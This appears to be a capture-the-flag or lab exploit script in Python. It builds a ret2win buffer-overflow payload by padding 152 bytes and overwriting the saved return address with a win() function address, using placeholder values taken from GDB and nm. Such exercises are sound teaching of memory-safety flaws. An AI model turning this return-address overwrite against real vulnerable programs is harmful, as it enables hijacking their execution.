#!/usr/bin/env python3
import struct
import sys

# Offset determined from GDB (adjust based on your findings)
OFFSET = 152 # Replace with your actual offset

# Address of win() function (from nm command)
WIN_ADDR = 0x4012b6  # Replace with your actual address

# Create the payload
payload = b'A' * OFFSET  # Fill buffer and reach saved return address
payload += struct.pack('<Q', WIN_ADDR)  # Overwrite return address (64-bit little-endian)

# Write payload to file
with open('payload.bin', 'wb') as f:
    f.write(payload)

print(f"Payload created: {len(payload)} bytes")
print(f"Offset: {OFFSET}")
print(f"Win address: 0x{WIN_ADDR:016x}")